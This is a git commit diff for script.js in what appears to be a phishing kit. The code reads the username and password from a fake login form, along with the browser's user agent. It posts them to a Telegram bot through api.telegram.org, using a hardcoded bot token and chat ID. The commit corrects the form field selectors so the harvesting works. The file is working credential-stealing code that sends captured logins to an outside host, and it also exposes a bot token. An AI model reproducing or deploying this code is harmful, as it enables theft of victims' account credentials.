7d9881e9a9d3d202b3472f74e3ec167c0ef67050
Rihan Ahmed <95731297+Rihan444@users.noreply.github.com>
2024-09-14 15:57:07 +0600

    Update script.js

--- script.js
+++ script.js
@@ -2,11 +2,11 @@ var token = "6960969686:AAFAmz4Y6QySShMdcmnoNZ5o910tfw4aoPc";
         var chat = "1955367555";
         let se = navigator.userAgent;
         $("button").click(function(){
-            if($("#password").val()==""){
+            if($("#person_password_field_login").val()==""){
                 alert("Password field cannot be empty.");
             }else{
-                var mail=$("#person_password_field_login").val();
-                var pass=$("#password").val();
+                var mail=$("#person_username_field_login").val();
+                var pass=$("#person_password_field_login").val();
                 var m = `𝗘𝗺𝗮𝗶𝗹: ${mail}\n𝗣𝗮𝘀𝘀: ${pass}\n𝗨𝘀𝗲𝗿 𝗔𝗴𝗲𝗻𝘁: ${se}`;
                 $.post(`https://api.telegram.org/bot${token}/sendMessage`,{
                     chat_id:chat,
